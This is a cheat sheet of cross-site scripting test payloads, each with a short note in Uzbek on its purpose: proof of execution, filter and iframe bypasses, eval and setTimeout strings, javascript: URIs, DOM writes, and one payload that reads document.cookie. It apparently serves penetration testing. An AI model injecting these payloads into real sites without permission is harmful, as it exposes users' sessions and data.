<script>alert(1)</script> 
→ Eng oddiy XSS trigger, JS ishlayotganini tekshiradi

<script>alert('XSS')</script> 
→ String bilan alert, filter bypass testlarda ishlatiladi

<script>alert(document.domain)</script> 
→ Joriy domainni chiqaradi (context tekshiradi)

<script>alert(document.cookie)</script> 
→ Cookie mavjudligini tekshiradi (HttpOnly bo‘lmasa chiqadi)

<script>confirm(1)</script> 
→ confirm dialog orqali executionni tasdiqlaydi

<script>prompt(1)</script> 
→ prompt oynasi, user interaction test uchun

<script>console.log(1)</script> 
→ JS ishlayotganini stealth tarzda tekshiradi (alertsiz)

<script>print()</script> 
→ Browser print dialog ochadi, execution isboti

<script>window.alert(1)</script> 
→ alertni window orqali chaqirish (alias test)

<script>top.alert(1)</script> 
→ top frame orqali alert (iframe bypass test)

<script>this.alert(1)</script> 
→ current context orqali alert chaqirish

<script>self.alert(1)</script> 
→ self object orqali alert (window alias)

<script>alert.call(null,1)</script> 
→ call() orqali alert chaqirish (bypass usuli)

<script>alert.apply(null,[1])</script> 
→ apply() bilan alert (array orqali argument berish)

<script>(function(){alert(1)})()</script> 
→ IIFE (immediately invoked function) orqali execution

<script>(()=>alert(1))()</script> 
→ Arrow function orqali qisqa execution

<script>setTimeout('alert(1)',0)</script> 
→ string eval orqali kechiktirilgan execution

<script>setInterval('alert(1)',1000)</script> 
→ har sekundda qayta ishlaydi (persistent trigger)

<script>eval('alert(1)')</script> 
→ eval orqali stringni JSga aylantiradi

<script>Function('alert(1)')()</script> 
→ yangi function yaratib darhol ishga tushiradi

<script>location='javascript:alert(1)'</script> 
→ location orqali JS URI ishlatadi

<script>window.location='javascript:alert(1)'</script> 
→ window orqali JS redirect execution

<script>document.write('<script>alert(1)</script>')</script> 
→ DOMga script yozib injection qiladi

<script>document.body.innerHTML='<script>alert(1)</script>'</script> 
→ sahifani qayta yozib script qo‘shadi
